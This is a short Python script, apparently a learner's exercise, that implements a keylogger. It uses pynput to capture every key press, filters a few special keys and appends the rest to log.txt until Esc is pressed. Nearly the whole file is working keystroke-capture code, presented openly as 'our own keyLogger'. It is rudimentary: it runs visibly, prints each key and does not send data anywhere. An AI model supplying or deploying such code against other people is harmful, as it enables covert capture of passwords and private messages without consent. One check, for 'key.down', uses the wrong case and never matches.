# File handling
# r = read
# w = write
# a = append
# SSL (Secure Socket Layer) and TLS (Transport Layer Security)
# Multipurpose Internet Mail Extensions
# f = open("log.txt", 'w')  # writing to a file if exit and if not exit then it creates file
# # data = f.read()
# # print(data)
# f.write("Creating our own keyLogger")
# f.close()

from pynput.keyboard import Listener, Key


def write_to_file(key):
    key_data = str(key)
    print(key_data)
    key_data = key_data.replace("'", "")
    if key_data == 'Key.alt_l':
        key_data = ''
    if key_data == 'Key.tab':
        key_data = ''
    if key_data == 'Key.backspace':
        key_data = ''
    if key_data == 'Key.enter':
        key_data = '\n'
    if key_data == 'key.down':
        key_data = ''
    if key_data == 'Key.space':
        key_data = ' '
    if key_data == 'Key.caps_lock':
        key_data = ''
    if key_data == 'Key.shift':
        key_data = ''
    if key_data == 'Key.ctrl_l':
        key_data = ''

    with open("log.txt", 'a') as f:
        f.write(key_data)


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=write_to_file, on_release=on_release) as l:
    l.join()
